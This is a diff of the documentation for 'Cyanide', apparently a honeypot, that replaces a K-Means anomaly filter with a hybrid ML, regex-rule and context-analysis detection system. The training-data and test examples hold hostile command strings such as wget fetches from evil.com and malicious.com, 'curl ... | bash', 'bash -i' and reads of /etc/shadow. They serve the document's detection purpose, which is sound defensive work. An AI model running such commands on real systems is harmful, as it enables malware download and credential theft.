@@ -1,106 +1,119 @@
-# Machine Learning Documentation
+# Cyanide Hybrid Detection System
 
-Cyanide uses a dedicated ML module (`cyanideML`) located in `src/cyanide/ml/cyanideML` to filter traffic, detect anomalies, and benchmark performance.
+Cyanide employs a **Hybrid Detection System** that fuses three distinct analysis layers to detect malicious activity with high precision and explainability.
 
-## src/cyanide/ml/cyanideML
+## Architecture
 
-### `model.py`
-**Class:** `HoneypotFilter`
-The main ML model wrapper.
-*   **Parameters:** `n_clusters`, `batch_size`.
-*   **Logic:** Uses online K-Means clustering (MiniBatchKMeans) to learn "normal" traffic patterns.
-*   **Functions:**
-    *   `process_log(log_entry)`: Returns `(is_anomaly, reason, distance)`.
-    *   `_update_threshold()`: Dynamically adjusts the anomaly threshold using statistical analysis (IQR) of recent distances.
+The detection pipeline processes every command entered by an attacker through three parallel engines:
 
-### `feature_extractor.py`
-**Class:** `FeatureExtractor`
-Converts raw log entries into numerical feature vectors.
-*   **Features:**
-    *   Text Hashing (HashingVectorizer on command/username/input).
-    *   Port usage (One-hot encoding of top ports).
-    *   Entropy analysis (Shannon entropy of strings).
-    *   Shell metacharacter counts.
+1.  **ML Anomaly Detector (Autoencoder)**: Detects *unknown* or *deviant* patterns based on character distribution.
+2.  **Security Rule Engine (Regex)**: Detects *known* attack signatures (e.g., `wget`, `curl`, logical operators).
+3.  **Context Analyzer**: Evaluates the reputation of referenced files, paths, and URLs.
 
-### `knowledge_base.py`
-**Class:** `KnowledgeBase`
-Stores and searches threat intelligence data.
-*   **Functions:**
-    *   `add_entry(source, content, metadata)`: Add threat intelligence entry.
-    *   `search(query)`: Search for matching entries using TF-IDF similarity.
-    *   `save(path)`: Persist knowledge base to disk.
-    *   `load(path)`: Load knowledge base from disk.
+The results are fused by the `HybridPipeline` using an override logic:
+- **ML** provides the baseline anomaly score.
+- **Rules** can confirm a specific attack technique (boosting confidence).
+- **Context** can elevate a suspicious command to malicious based on touched resources.
 
-### Training the Knowledge Base
+---
 
-The knowledge base is trained on threat intelligence data from multiple sources:
+## Components
 
-#### Data Sources
-*   **MITRE ATT&CK**: Tactics, techniques, and procedures (TTPs)
-*   **CVE Database**: Common vulnerabilities and exposures
-*   **ExploitDB**: Exploit patterns and signatures
-*   **Hacker Methods**: Common attack patterns and command sequences
+### 1. ML Anomaly Detector (`src/cyanide/ml/model.py`)
+- **Type**: LSTM/GRU Autoencoder (PyTorch).
+- **Input**: Character-level tokenization of the command string.
+- **Output**: `Reconstruction Error` (Anomaly Score).
+- **Logic**: The model is trained on "normal" hacker commands (bootstrapped from honeypot data). It learns to reconstruct these patterns. High reconstruction error indicates a command structure the model hasn't seen (potential zero-day or obfuscation).
 
-#### Training Process
+### 2. Knowledge Base (`src/cyanide/ml/classifier.py`)
+- **Type**: TF-IDF Vectorizer + Cosine Similarity.
+- **Data**: MITRE ATT&CK techniques, CVEs, and known hacker methods.
+- **Function**: When an anomaly is detected, the KB attempts to *classify* it by finding the most similar known attack pattern.
+- **Output**: MITRE Technique ID (e.g., `T1059.004`), Tactics, and Description.
 
-1. **Prepare Training Data**
-   Place your training data in the following directories:
-   ```
-   data/ml_training/hacker_methods/  - Attack pattern files
-   data/ml_training/kb_ready/        - MITRE/CVE/ExploitDB data
-   ```
+### 3. Security Rule Engine (`src/cyanide/ml/rule_engine.py`)
+- **Type**: Regex-based pattern matcher.
+- **Role**: Deterministic detection of high-confidence threats.
+- **Rules**: Defined in `src/cyanide/ml/rules.py` (e.g., download utilities, shell pipes, sensitive file access).
 
-2. **Run Training Script**
-   ```bash
-   python3 src/cyanide/ml/cyanideML/train_kb.py
-   ```
+### 4. Context Analyzer (`src/cyanide/ml/context_analyzer.py`)
+- **Role**: Semantic analysis of arguments.
+- **Checks**:
+    - **URL Reputation**: Checks domains against blocklists (local/remote).
+    - **File Sensitivity**: Flags access to `/etc/shadow`, `/root/.ssh`, etc.
 
-3. **Training Configuration**
-   The training script will:
-   *   Load all JSON/text files from training directories
-   *   Extract relevant features (commands, patterns, signatures)
-   *   Build TF-IDF vectorizer for similarity search
-   *   Save the trained knowledge base to `knowledge_base.pkl`
+---
 
-4. **Verify Training**
-   ```bash
-   python3 src/cyanide/ml/cyanideML/test_kb.py
-   ```
+## Configuration (`configs/app.yaml`)
 
-#### Data Format
+The ML system is configured via the `ml` section:
 
-Training data should be in JSON format:
+```yaml
+ml:
+  enabled: true
+  
+  # Paths
+  model_path: assets/models/cyanideML.pkl
+  ml_log: var/log/cyanide/cyanideML-log.json
+  
+  # Training Data
+  training_data:
+    hacker_methods: "data/raw"          # Directory containing .jsonl command logs
+    mitre_cve: "data/processed/kb_ready" # Directory with KB definitions
+  
+  # Operational Settings
+  online_learning: false       # Enable dynamic retraining (experimental)
+  retraining_interval_days: 7  # Auto-retrain frequency
+```
+
+---
+
+## Training & Management
+
+### 1. Training the Model
+
+To train the Anomaly Detector and build the Knowledge Base:
+
+```bash
+# Train from scratch (force retrain)
+python3 scripts/training/train.py --train-model --force
+
+# Build/Update Knowledge Base only
+python3 scripts/training/train.py --build-kb
+```
+
+### 2. Data Format
+
+**Training Data (`data/raw/*.jsonl`)**:
+Line-delimited JSON files containing commands.
+```json
+{"command": "ls -la", "timestamp": "..."}
+{"command": "wget http://evil.com/malware", "timestamp": "..."}
+```
+
+**Knowledge Base Data (`data/processed/kb_ready/*.json`)**:
+JSON definitions of techniques.
 ```json
 {
-  "source": "MITRE",
   "id": "T1059.004",
-  "name": "Command and Scripting Interpreter: Unix Shell",
-  "description": "Adversaries may abuse Unix shell commands...",
-  "examples": ["bash -i", "sh -c", "/bin/sh"]
+  "name": "Unix Shell",
+  "description": "Adversaries may abuse Unix shell...",
+  "examples": ["sh -c", "bash -i"]
 }
 ```
 
-Or for exploit patterns:
-```json
-{
-  "source": "ExploitDB",
-  "pattern": "wget http://malicious.com/payload.sh",
-  "category": "remote_download",
-  "risk": "high"
-}
+---
+
+## Testing & Verification
+
+Run the comprehensive test suite to validte the hybrid system:
+
+```bash
+pytest scripts/management/test_hybrid_system.py
 ```
 
-### `validate_model.py`
-Basic validation script.
-*   **Function:** `validate()`
-*   Runs a test against `var/log/cyanide/cyanide_synthetic.json` (if available) to calculate Accuracy, Precision, Recall, and F1 Score by mixing normal logs with generated random anomalies.
-
-### `validate_advanced.py`
-Advanced validation scenarios.
-*   Generates complex attack patterns (SQLi, obfuscated shell commands, reverse shells).
-*   Tests the model's ability to distinguish subtle attacks from normal administrative behavior.
-
-### `benchmark.py`
-Performance testing script.
-*   Measures latency per log (Target < 1ms).
-*   Tracks memory usage and throughput.
+This tests:
+1.  **Clean Commands**: `ls -la` should be CLEAN.
+2.  **Known Attacks**: `curl ... | bash` should be DETECTED (Rule+ML).
+3.  **Obfuscation**: `c''u''r''l` should be DETECTED (ML High Error).
+4.  **Context**: Accessing `/etc/shadow` should be DETECTED (Context).
